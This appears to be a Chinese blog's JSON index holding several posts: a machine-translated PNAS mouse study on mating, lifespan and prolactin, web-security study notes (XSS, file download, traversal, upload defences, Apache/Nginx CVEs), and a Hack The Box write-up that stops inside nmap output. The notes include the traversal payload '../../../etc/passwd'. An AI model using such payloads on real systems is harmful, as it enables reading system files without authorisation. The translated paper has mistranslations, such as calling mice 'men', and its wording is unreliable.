https://www.pnas.org/doi/10.1073/pnas.2003159117#supplementary-materials) ，但是，以前的社会经验对产仔率有很强的影响。之前与不同住房伙伴配对的雌性以不同的速率产生头两至四窝(第二窝时间的处理效果，P = 0.037; 第三窝时间，P = 0.044; 第四窝时间，P =  0.046)。这是先前与输精管切除雄性配对的雌性与先前与其他雌性一起饲养的雌性相比较快产仔数产生的结果(图2 C)  ，尽管这种组间差异减少，并且在第四窝后不显着。\n\n我们还测试了以前的社会环境是否影响了幼崽的性别比例或体重。以前的住房条件影响断奶后产仔的性别比($F_{3,69} = 4.11$，P =  0.010)(图2 D)。这种效应是由于以前饲养完整雄性的雌性在断奶时比以前饲养雌性的雌性产生更多的雄性偏向的窝，而其他处理的雌性的性别比例是相似的。与以前与其他雌性一起饲养的雌性相比，以前与完整雄性一起饲养的雌性产生的雌性后代较少(SI 附录，图S2) ，导致性别比例的差异，而雄性后代的数量在这两组之间没有显着差异(SI  附录，图S3)。然而，我们也注意到，那些先前与完整雄性一起饲养的雌性所产生的雌性后代越少，在断奶时也会稍微重一些(SI 附录，图S4) ，雄性后代没有体重差异(SI 附录，图S5)。这突出了性别分配的潜在变化，可能会影响适应性的后果减少晚年后代生产回应早期生殖投资。\n\n**早期与输精管切除男性交配导致女性寿命缩短。**\n\n在啮齿类动物中的实验已经反复记录了在各种实验室(15)和野生来源(16)菌株中观察到的允许在整个生命周期内繁殖的寿命成本。这代表了在实验室和野外观察到的各种动物物种之间更广泛的权衡(17)。通过比较在生命的前300天内与不同性腺状态的雄性一起饲养的雌性，然后与另一只雌性一起饲养，我们能够测试雄性的存在是否有助于以前记录在哺乳动物繁殖中的寿命效应。在生命的最初300天，与不同伴侣同住的雌性的寿命有显著差异(对数秩检验，P = 0.024)(图3)。这是由于输精管切除女性与其他女性相比寿命较短的结果(P =  0.014)。这表明没有受精的交配对雌性小鼠的存活有不利影响。与其他雌性动物相比，在前300天内与完整雄性配对的效果与寿命显着降低无关(P =  0.14) ，尽管由于在前300天出生困难，一些动物从寿命分析中被删除。每组动物的中位数和最大寿命值列于 SI 附录表  S3中，出生和死亡的个别日期列于数据集 S1中。\n\n> 图3.\n>\n> ![image-20221025210003870](../image/image-20221025210003870.png)\n>\n> 早期接受输精管切除术的男性会降低女性的寿命。雌性在300天之前居住在不同的社会环境中，然后与另一只雌性居住在一起的生存曲线。每个点代表一个鼠标死亡的时间点。红色星号表示先前饲养雌性和先前饲养输精管切除雄性之间的生存差异(P < 0.05) ，用对数秩检验计算。\n\n<u>从图3中我（进行机翻的我）可以**感觉**到：</u>\n\n1) ==*早期那些违反自然的雄性（阉割与结扎鼠）会降低雌鼠的存活率。*==\n2) ==*猜想：早期完整雄鼠接触的雌鼠存活率高是鼠群为了繁衍。*==\n3) ==*在中期之后（大约700天后），未接触正常雄激素（全雌与阉割雄鼠）的雌鼠寿命更长。*==\n4) ==*在后期（大约900天至1000天左右），全雌的存活率是最高的。*==\n5) ==*大约1000天之后，未接触正常雄激素（全雌与阉割雄鼠）的雌鼠仍然比其他的存活率略高一些。*==\n6) ==*“在早期（头300天），与全雌实验组相比，和完整雄鼠配对的雌鼠实验组影响与寿命的显著减少没有关联(P = 0.14)，尽管一些动物由于在头300天分娩困难而从寿命分析中删除了。”这句话说明绿线比黑线高是因为早期分娩死亡的雌鼠样本被删除了。*==\n\n**循环催乳素的持续改变与交配后的生活史反应有关。**\n\n输精管切除男性存在的生活史后果可能是由社会交往过程中发生的各种不同过程引起的，**包括男性接触、精液转移和对男性线索的感知反应。**在啮齿动物中，交配期间感知的雄性刺激引起假怀孕，其中性交刺激产生类似于早孕的神经内分泌反应(6)  ，由催乳素分泌的日间激增驱动(18)。已经表明，实际妊娠和哺乳期的催乳素激增可导致生殖经验丰富的动物催乳素分泌减少，这与未来神经元对这种激素的敏感性增强和母亲行为表达的改善有关(19)。**==由于假怀孕也导致催乳素暴露，我们测试了是否改变催乳素分泌发生后，与输精管切除的雄性交配经验，并可能与生活史的变化有关。==**\n\n我们评估了从18个月和24个月大的小鼠收集的血浆样品中的催乳素浓度，包括来自允许在晚年繁殖的小鼠(图2)和那些饲养在非生殖环境中的小鼠(图3)的样品。分析两个时间点的数据显示，早期社会环境(例如，300天前的年龄)对催乳素水平有显着影响(早期治疗的效果: $F_{3,157.58} = 2.69$，P =  0.049)。从21天到300天的输精管切除男性饲养的女性在18和24个月时血浆催乳素浓度低于早期饲养其他女性的女性(图4)。此外，晚期治疗(例如，允许复制或不允许复制; $F_{1,169.23} = 10.09$，P = 0.002) ，这两个因素之间没有相互作用(早期和晚期治疗之间的相互作用: $F_{4,256.96} = 1.62$，P = 0.28)。这表明那些晚年与男性生活在一起的女性也表现出循环催乳素的减少(图4)  ，这种效应是与早期社会条件的影响相加的。因此，男性的互动可以导致终身循环催乳素的变化，这种变化持续存在于不同的社会环境中，并与改变的生活史和老龄化有关。\n\n> 图4.\n>\n> ![image-20221025210144640](../image/image-20221025210144640.png)\n>\n> 交配后循环催乳素的持续抑制。数据被分割，以显示在获得样本时，早期生活条件(有色条)和非生殖(雌性)或生殖(雄性)环境中的房屋的影响。数据代表平均值 ± SEM。* * 先前与输精管切除男性一起居住的女性与先前与其他女性一起居住的女性(红色星号)之间的差异显著(P < 0.01)  ，计算广义线性混合模型包括来自18个月和24个月采样点以及两组晚年生殖状态的数据。18个月时每组13至25人，24个月时每组11至25人。\n\n#### 讨论\n\n==**我们的研究结果表明，单独存在雄性大大影响了小鼠的雌性生活史，促进了体重的增加，这种增加可以持续一生，增强了后来与有生育能力的雄性交配时的生殖产量，但导致了寿命的减少。**==这表明，通常归因于哺乳动物怀孕和哺乳的生殖成本和后果(3,4)也可能是由于雄性存在(如交配)而发生的相互作用的结果，而不管在父母照顾方面的投资如何。\n\n我们的研究没有确定哪些方面的男性存在导致这些变化。雌性配对阉割的雄性在生活史或年龄上没有变化。因此，我们可以排除这种影响是由于个体暴露于女性数量的差异而产生的可能性，**==并推断这种影响与雄激素依赖性控制下表达的男性性状有关，如交配和一些嗅觉性信号。==**\n\n交配对无脊椎动物雌性寿命的影响通常归因于精液转移的后果，雄性射精中释放的精液蛋白随着性冲突的强度进化(20) ，促进当前交配后的雌性产卵(21) ，但减少雌性寿命(8)。有证据表明，精液蛋白在啮齿动物进化过程中已经多样化，特定蛋白的进化与预测的精子竞争强度一致(22)  ，因此也与性冲突。**==暴露于哺乳动物的精液也有利于通过诱导炎症反应植入，最终促进胎儿生长(23)。==** **对精液的炎症反应是否对母亲的生理学以及最终对女性的后续生活史后果产生系统性影响，为今后的研究提供了一个富有成效的途径。**\n\n雌性啮齿动物对交配表现出适应性的自我调节的神经内分泌反应，在怀孕的前半期维持生殖激素水平。**假怀孕的发生就是一个例子，不育的交配导致神经内分泌激素反应，模仿早期怀孕(6)。假怀孕是一种强烈的反应，发生在输精管切除雄性小鼠交配的80%  (24)。**因此，在我们的输精管结扎男性治疗周期通过反复假怀孕。**==相比之下，阉割的雄性不会引起假怀孕，因为他们不交配。==** 因此，从28至300天的年龄，与输精管切除的男性配对的女性与其他治疗组相比，**==假怀孕的频率增加，并且在这些时期发生的激素反应可能具有影响生活史的长期影响。==**\n\n假妊娠和实际妊娠的前半部分是通过交配后12天催乳素的昼夜激增来维持的(25)。这样的荷尔蒙暴露可以导致神经内分泌适应，有助于促进生殖在随后的事件。与对照组相比，早期与输精管切除男性配对的女性晚年循环催乳素水平较低，这种效应在晚年社会环境中都是一致的。循环催乳素的减少可能表明下丘脑反馈增强导致激素敏感性增加(26)。相对于以前的胎次，这些神经内分泌适应已经被证明可以增强母亲的行为，例如幼犬回收(19)。如果先前与输精管切除男性配对的女性循环催乳素水平下降反映下丘脑反馈增强，这可能有助于改善这些女性晚年生育能力。\n\n催乳素的分泌受额外的激素轴调节，包括应激反应(27)和生长激素信号传导(28)。此外，这些额外的激素系统的活动本身可以改变的社会条件(29)。因此，其他相互关联的激素系统的初始变化，如交配应激反应减弱(29)  ，也可能导致观察到的社会条件和循环催乳素之间的关系。不管最初的触发，生殖，生长和/或压力荷尔蒙轴的变化是很好的候选信号，可能导致生活史改变响应社会线索。在秀丽隐桿线虫中，特定的胰岛素信号被激活，并且响应于男性信息素暴露而影响寿命，而雷帕霉素信号的机制目标有助于加速老化对精液的反应(11,30)。因此，几种不同的信号通路可以被交配线索激活，每一种都可能导致生活史和老化反应。我们的研究没有确定早期接触输精管切除男性后女性寿命变化的机制，但是这种反应足以降低男性切除后女性的晚期生存率。需要进一步的研究来确定生存率的变化是否与导致死亡的特定途径或疾病有关，以及这是否与晚年生理功能下降或衰老的其他方面有关。\n\n**==交配导致的寿命缩短是显著的==**，尽管相对温和，但是由于生命前三分之一时间所经历的环境条件而发生。这将有助于确定这些影响是否在雌性交配，没有受精，整个生活期间更强。事实上，与以前的研究显示由于整个生命期的重复怀孕而导致寿命缩短(15,16)相反，我们仅在前300天内看到与完整雄性交配的雌性的寿命没有显着变化，与没有男性暴露的女性相比。交配、怀孕和哺乳的影响可能是累积的，并且随着暴露时间的延长而增加。\n\n**雄性完整的雌性在怀孕期间不会交配(21天)  ，而与输精管切除的雄性配对的雌性在12天假妊娠后恢复发情。**因此，**==雌性与切除输精管的雄性配对的较高交配率可能会影响它们的寿命。==**这种交配速率的影响已经在黑腹果蝇中报道过了。输精管切除的雄性和完整的雄性在与雌性的社会交往方面也可能有所不同，完整的雄性暴露在幼崽的笼子里。我们观察到完整男性和输精管切除男性之间的侵略性或女性伤害没有差异，我们以前观察到输精管切除男性的女性实际上降低了同居女性的皮质酮水平(32)。然而，一个详细的社会互动研究，结合操纵交配的频率暴露和精液转移，需要解决潜在的男性因素产生这些反应。\n\n越来越多的人认识到，生活史可以通过社会互动甚至社会环境的感知线索来调节(29,33)。虽然最近在无脊椎动物中已经探索了实验证据和潜在的机制(9,11)  ，但是哺乳动物可以调节性成熟，发情周期和响应同种气味线索维持妊娠(5,34)。**我们的研究结果表明，性暗示和社会互动经历在特定时期的生活可以有影响，持续整个寿命的一些雌性哺乳动物。==在人类中，妇女可以表现出肥胖和催乳素分泌的持久变化，这种变化在分娩后至少十年内仍然可以检测到(35-38)。==**了解这些影响的机制，以及驱动这些反应的特定线索和生殖过程，可能有助于揭示生命过程因素(例如，育儿，性同居)如何导致生理学和性别特异性健康差异的性别差异。\n\n#### 方法\n\n**动物。**\n\n这项研究得到了新南威尔士大学(UNSW)动物护理和伦理委员会的批准(批准15/70B)。所有实验均按照批准的指导方针进行。小鼠是 C57BL/6J  菌株，其中阉割和输精管切除术对雄性交配行为和雄激素依赖性信号传导的后果已经确定，已知阉割可以迅速减少雄性交配行为(13,39)。小鼠购自澳大利亚生物资源中心(库存 C57BL/6JAusb) ，作为 C57BL/6J 小鼠的库存，从杰克逊纪念实验室进口相同的动物品系。\n\n实验分为四个大小相等的批次进行，处理组均匀地分布在各批次中。雌性小鼠在3周龄时被运到新南威尔士州。对于雄性小鼠，在运往新南威尔士州之前，在6至8周龄时对动物进行去势、输精管切除或假输精管切除(完整)。对于所有的手术，动物用氯胺酮和美托咪定混合物麻醉，然后给予酮洛芬镇痛。在腹部做了一个切口，在输精管切除的男性中，两个输精管都被烧灼。在阉割的雄性中，两个睾丸在手术过程中也被切除。完整的(假)雄性进行了同样的手术伤口，显示了血管性痴呆，但没有被烧灼。\n\n小鼠被允许恢复1周，然后送到新南威尔士大学，在那里他们被允许在不同的社会条件下饲养之前再习惯1周。小鼠在12:12小时的反向光照/黑暗周期中维持在22 ± 2 °C，黑暗周期从上午9点开始。他们被喂养小鼠和大鼠维持颗粒(戈登的特殊股票饲料)。光周期被逆转，因此实验操作发生在暗红色光下的黑暗时期。\n\n**实验程序。**\n\n所有实验雌性均与雌性同胞一起饲养; 然后在28天时，这些兄弟姐妹对被随机分配到另外一个不熟悉的雌性，去势雄性，输精管切除雄性或完整的雄性(每组 n =  54，每笼3只动物)。住房合作伙伴年龄在9至10周的配对。对于与完整雄性配对的雌性，后代保持在家庭笼子内，直到它们在21岁断奶并从笼子中移除  d。在此期间，所有雌性产生产仔数(平均产仔数，8.77; 范围，2至12)。在300天的年龄(图1 A)  ，原来的住房伙伴被移除，女性随后与她们的女性兄弟姐妹(每个早期社会群体 n =  30，每个笼子2只动物)或与他们的女性兄弟姐妹和9至10周龄的完整男性(每个早期生活社会群体 n =  24，每个笼子3只动物)。雌性动物被安置在同一个房间的开放式笼子(48 × 11.5 ×  12cm)中，不同组别的雌性动物的笼子在架子上随机分配。因此，不同治疗组的女性被暴露在相同水平的背景听觉和嗅觉线索发出的笼子外面，他们被安置在。所有女性在2,3,6,12,18和24个月时称重，在6,18和24个月时，在非禁食动物的黑暗期的前3小时收集小血样。在加热灯下短暂停留一段时间后，在尾巴的底部做了一个小切口。将不超过100μL 的血液样品收集到 EDTA 包被的管中，然后获得血浆并储存在 -80 °C 直到用于分析。\n\n**晚期生殖评估。**\n\n雌性在300天时与雌性放在一起后，被允许与完整的雄性连续繁殖。后代留在家中，直到21日龄断奶并被带走。在这个时间点，后代的数量和重量被记录下来。在转向与完整的雄性一起居住之后，有几只雌性在第一窝产仔期间由于分娩困难而死亡。从分析中除去这些动物(先前与雌性或去势雄性配对的雌性24只小鼠中的3只;  先前与输精管切除雄性一起饲养的雌性4只，以前与完整雄性一起饲养的1只)。为了评估繁殖力，我们记录了每只雌性断奶后代的数量(21天)、产仔量、产仔数、产仔间隔时间和最后一窝的年龄。为了确保我们从300天开始评估总的生育能力，尽管最后一窝记录在610天的雌性胎儿中，但是雌性胎儿一直被监测到死亡。\n\n**寿命评估。**\n\n正如在小鼠寿命研究中的典型情况(40)  ，雌性在300天后与它们的兄弟姐妹关在一起评估寿命。女性一直保持在这些标准条件下，直到死亡或直到他们被认为是如此严重的垂死，他们不太可能存活额外的48小时(40)。严重死亡表现为以下一种或多种临床症状:  体重迅速减轻，对手动刺激无反应，颤抖/驼背或不动的姿势，呼吸困难和不规则，严重腹部扩大(与怀孕无关)或严重溃疡肿瘤。一只垂死的老鼠被安乐死的年龄可以作为它的寿命的估计，每天检查时也会记录发现死亡的老鼠。由于与男性发生激烈争斗或生育困难，一些在幼年时与完整男性居住在一起的女性被逐出人口。为了进行生存分析，这些动物被删节了。\n\n**催乳素测定。**\n\n对于所有18至24个月大的动物样本，如前所述(41) ，使用含有抗体和美国国家激素和肽计划标准的催乳素酶联免疫吸附试验进行评估。汇集的小鼠血浆样品一式两份穿过平板显示在0.9% 和4.7%  之间的板内测定变异系数(即，平板内对照样品值的变异)和2.28% 的板间测定变异系数(即，跨平板对照样品值的变异)。\n\n**统计分析。**\n\n统计分析采用 SPSS  25版(IBM)。在分析之前，对数据进行可视化评估，以确定特定测试的参数假设的构象，并在必要时对数据进行对数转换，以符合相关假设。在我们之前的研究(32)之后，我们首先测试了四个治疗组的早期生活社会环境对兴趣特质是否有整体的显著影响。当这种治疗效果显著时(P < 0.05) ，我们进行了有计划的对比，以测试哪些男性居住环境与对照组(与其他女性居住在一起)不同。\n\n我们使用重复测量广义线性模式来评估体重的变化，分别分析300天前和300天后的体重数据，因为女性被安置在不同的环境中。为了评估繁殖力，我们使用  GLMM，包括 Dam ID  和兄弟姐妹对作为随机效应，以控制同一个体产生的重复产仔数和笼养在一起的雌性的共同护理的可能性。以往的社会治疗和配对以来的时间作为固定效应包括在内。为了评估18岁和24个月时的催乳素，我们使用了 GLMM，包括 Dam ID  作为随机效应来控制在不同时间点从同一女性收集的样品，早期和晚期治疗作为单独的固定效应，以及动物年龄/板作为额外的固定效应(来自不同年龄的样品在几个不同的板上运行)。生存数据采用对数秩检验进行分析。\n\n**数据可用性。**\n\n所有相关的数据都可以在开放科学网上找到。\n\n#### 辅助资料\n\n详见原文地址。有两个PDF。\n\n#### 参考文献\n\n详见原文地址。\n\n","tags":["隐藏内容"],"categories":["碎碎念"]},{"title":"web攻防笔记第53天","url":"/2023/08/27/web攻防笔记第53天/","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"web攻防笔记第52天","url":"/2023/08/27/web攻防笔记第52天/","content":"\n## #XSS跨站-输入输出-原理&分类&闭合\n\n漏洞原理：接受输入数据，输出显示数据后解析执行 \n\n基础类型：反射(非持续)【用处比较小】，**存储(持续)**，**DOM-BASE** \n\n拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等 \n\n常用标签：https://www.freebuf.com/articles/web/340080.html \n\n攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等 \n\n安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等 \n\n测试流程：**看输出，想输入在哪里，更改输入代码看执行（标签，过滤决定）**\n\n## #XSS跨站-分类测试-反射&存储&DOM\n\n-**数据交互的地方，交互的地方越多利用价值越大** \n\nget、post、headers \n\n反馈与浏览 \n\n富文本编辑器 \n\n各类标签插入和自定义 \n\n-**数据输出的地方** \n\n用户资料 \n\n数据输出 \n\n评论，留言等 \n\n关键词、标签、说明 \n\n文件上传\n\n- 反射型XSS：（某案例测试） 常见情况是攻击者通过构造一个恶意链接的形式，诱导用户传播和打开， 由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。\n- 存储型XSS：（某案例测试） 存储型XSS是持久化的XSS攻击方式，将恶意代码存储于服务器端， 当其他用户再次访问页面时触发，造成XSS攻击。\n- DOM-base型XSS：（某案例测试） 通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。 页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行。\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"web攻防笔记第51天","url":"/2023/08/27/web攻防笔记第51天/","content":"\n## #文件安全-下载&删除-黑白盒\n\n1、下载=读取 常规下载URL：http://www.xiaodi8.com/upload/123.pdf 直连连接\n\n可能存在安全问题URL：http://www.xiaodi8.com/xx.xx?file=123.pdf \n\n利用：常规下载敏感文件（数据库配置，中间件配置，**系统密匙**等文件信息）\n\n安全问题：**下载的文件以参数值去发送解析下载，如果更改的参数值就是指定下载文件**\n\n思路：目录扫描得知目录文件结构，利用URL下载源码，观察源码文件是什么项目，从网上找相关项目代码目录，接着继续下载。\n\n***\\*文件下载漏洞：\\****https://blog.csdn.net/qq_53079406/article/details/124076937\n\n```\n../../../etc/passwd\n```\n\n2、文件删除（常出现后台中）测试**比较危险，可能喝茶，大多后台** \n\n可能存在安全问题：前台或后台有删除功能应用 \n\n利用：常规删除重装锁定配合程序重装或高危操作\n\n文件相关漏洞类型：上传、下载、读取、删除、编辑\n\n## #目录安全-遍历&穿越-黑白盒\n\n1、目录遍历 \n\n目录权限控制不当，通过遍历获取到有价值的信息文件去利用\n\n2、目录穿越（常出现后台中） \n\n目录权限控制不当，通过控制查看目录路径穿越到其他目录或判断获取价值文件再利用\n\n## #黑盒分析\n\n1、功能点 \n\n文件上传，文件下载，文件删除，文件管理器等地方\n\n2、URL特征 \n\n文件名： download，down，readfile，read，del，dir，path，src，Lang等 \n\n参数名： file、path、data、filepath、readfile、data、url、realpath等\n\n## #白盒分析\n\n上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"web攻防笔记第49天","url":"/2023/08/27/web攻防笔记第49天/","content":"\n## 文件-解析方案-执行权限&解码还原\n\n1、执行权限 文件上传后存储目录不给执行权限\n\n2、解码还原 数据做存储，解析固定（文件后缀名无关） 文件上传后利用编码传输解码还原\n\n## 文件-存储方案-分站存储&OSS对象\n\n1、分站存储 [upload.xiaodi8.com](http://upload.xiaodi8.com/) 上传 [images.xiaodi8.com](http://images.xiaodi8.com/) 存储\n\n2、OSS对象 Access控制-OSS对象存储-Bucket对象\n\n访问只是下载，永远只是下载，传上去后门也没用。\n\n## 如何判断\n\n执行权限：上传后无法访问403【换另目录上传】\n\n解码还原：上传后抓包看RequestURL，是data:image/png;base64,一长串编码符号数据【无解】\n\n分站存储：看图片地址和上传域名不是一样的【无解】\n\nOSS对象：看URL或者去访问一下上传的地址，打开就下载【无解】\n\n## 安全绕过\n\n以上方案除目录设置权限如能换目录解析绕过外，其他均无解\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"web攻防笔记第48天","url":"/2023/08/02/web攻防笔记第48天/","content":"\n## PHP-中间件-上传相关-Apache&Nginx\n\n复现漏洞环境：vulhub （部署搭建看打包视频）\n\n由于PHP搭建常用中间件：IIS，Apache，Nginx\n\nWeb搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传\n\n## CVE-2017-15715（换行解析漏洞）\n\nhttps://blog.csdn.net/youthbelief/article/details/121258770\n\n- 版本：Apache2.4.0~2.4.29\n- 有上传点\n- 上传点可重命名文件\n\n## CVE-2013-4547\n\nhttps://blog.csdn.net/weixin_45744814/article/details/120390057\n\n- 版本：Nginx 0.8.41~1.4.3、Nginx 1.5.0~1.5.7\n\n## PHP-编辑器-上传相关-第三方处理引用\n\n复现漏洞环境：ueditor （部署搭建看打包视频） 由于编辑器漏洞较少，实战碰到机会不大，主要理解漏洞产生的思路 参考：https://cloud.tencent.com/developer/article/2200036 参考：https://blog.csdn.net/qq_45813980/article/details/126866682 引用到外部的第三方编辑器实现文件上传，编辑器的安全即是上传安全\n\n## PHP-CMS源码-上传相关-已知识别到利用\n\n复现漏洞环境：通达OA-V11.2 从未知的源码体系测试原生态上传安全，现在是已知CMS源码架构，利用已知的漏洞测试\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"HTB-Unified","url":"/2023/08/02/HTB-Unified/","content":"\n# Unified\n\n## 复现\n\n开局找教程：\n\n[https://blog.csdn.net/qq_40927195/article/details/128811787](https://blog.csdn.net/qq_40927195/article/details/128811787)\n\n[HackTheBox - Unified_unificms6.4.54_Briyney的博客-CSDN博客](https://blog.csdn.net/qq_45862635/article/details/125350250)\n\n开局就是一个扫描的动作：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# nmap -sC -sV 10.129.181.184\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 02:31 EDT\nNmap scan report for 10.129.181.184\nHost is up (0.36s latency).\nNot shown: 972 closed tcp ports (reset)\nPORT      STATE    SERVICE         VERSION\n17/tcp    filtered qotd\n22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)\n465/tcp   filtered smtps\n714/tcp   filtered iris-xpcs\n765/tcp   filtered webster\n1055/tcp  filtered ansyslmd\n1110/tcp  filtered nfsd-status\n1198/tcp  filtered cajo-discovery\n3001/tcp  filtered nessus\n3351/tcp  filtered btrieve\n3737/tcp  filtered xpanel\n3914/tcp  filtered listcrt-port-2\n4111/tcp  filtered xgrid\n5431/tcp  filtered park-agent\n5510/tcp  filtered secureidprop\n5906/tcp  filtered rpas-c2\n6789/tcp  open     ibm-db2-admin?\n8011/tcp  filtered unknown\n8080/tcp  open     http-proxy\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Tue, 25 Jul 2023 06:35:50 GMT\n|     Connection: close\n|     <!doctype html><html lang=\"en\"><head><title>HTTP Status 404 \n|     Found</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 \n|     Found</h1></body></html>\n|   GetRequest, HTTPOptions: \n|     HTTP/1.1 302 \n|     Location: http://localhost:8080/manage\n|     Content-Length: 0\n|     Date: Tue, 25 Jul 2023 06:35:49 GMT\n|     Connection: close\n|   RTSPRequest: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Tue, 25 Jul 2023 06:35:50 GMT\n|     Connection: close\n|     <!doctype html><html lang=\"en\"><head><title>HTTP Status 400 \n|     Request</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 \n|     Request</h1></body></html>\n|   Socks5: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Tue, 25 Jul 2023 06:35:52 GMT\n|     Connection: close\n|     <!doctype html><html lang=\"en\"><head><title>HTTP Status 400 \n|     Request</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 \n|_    Request</h1></body></html>\n8192/tcp  filtered sophos\n8443/tcp  open     ssl/nagios-nsca Nagios NSCA\n| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US\n| Subject Alternative Name: DNS:UniFi\n| Not valid before: 2021-12-30T21:37:24\n|_Not valid after:  2024-04-03T21:37:24\n8649/tcp  filtered unknown\n9091/tcp  filtered xmltec-xmlmail\n9102/tcp  filtered jetdirect\n10025/tcp filtered unknown\n10215/tcp filtered unknown\n32777/tcp filtered sometimes-rpc17\n38292/tcp filtered landesk-cba\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.93%I=7%D=7/25%Time=64BF6D46%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,84,\"HTTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8080\nSF:/manage\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Tue,\\x2025\\x20Jul\\x202023\\x\nSF:2006:35:49\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(HTTPOptions,84,\"H\nSF:TTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8080/manage\\r\\nCon\nSF:tent-Length:\\x200\\r\\nDate:\\x20Tue,\\x2025\\x20Jul\\x202023\\x2006:35:49\\x20\nSF:GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,24E,\"HTTP/1\\.1\\x204\nSF:00\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\nSF:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Tue,\\x2025\\x20Jul\\x202023\\\nSF:x2006:35:50\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!doctype\\x20html><ht\nSF:ml\\x20lang=\\\"en\\\"><head><title>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x2\nSF:0Bad\\x20Request</title><style\\x20type=\\\"text/css\\\">body\\x20{font-family\nSF::Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;ba\nSF:ckground-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-size\nSF::16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{c\nSF:olor:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:n\nSF:one;}</style></head><body><h1>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20\nSF:Bad\\x20Request</h1></body></html>\")%r(FourOhFourRequest,24A,\"HTTP/1\\.1\\\nSF:x20404\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Langu\nSF:age:\\x20en\\r\\nContent-Length:\\x20431\\r\\nDate:\\x20Tue,\\x2025\\x20Jul\\x202\nSF:023\\x2006:35:50\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!doctype\\x20html\nSF:><html\\x20lang=\\\"en\\\"><head><title>HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x9\nSF:3\\x20Not\\x20Found</title><style\\x20type=\\\"text/css\\\">body\\x20{font-fami\nSF:ly:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;\nSF:background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-si\nSF:ze:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20\nSF:{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border\nSF::none;}</style></head><body><h1>HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x93\\x\nSF:20Not\\x20Found</h1></body></html>\")%r(Socks5,24E,\"HTTP/1\\.1\\x20400\\x20\\\nSF:r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20en\\\nSF:r\\nContent-Length:\\x20435\\r\\nDate:\\x20Tue,\\x2025\\x20Jul\\x202023\\x2006:3\nSF:5:52\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!doctype\\x20html><html\\x20l\nSF:ang=\\\"en\\\"><head><title>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x2\nSF:0Request</title><style\\x20type=\\\"text/css\\\">body\\x20{font-family:Tahoma\nSF:,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:wh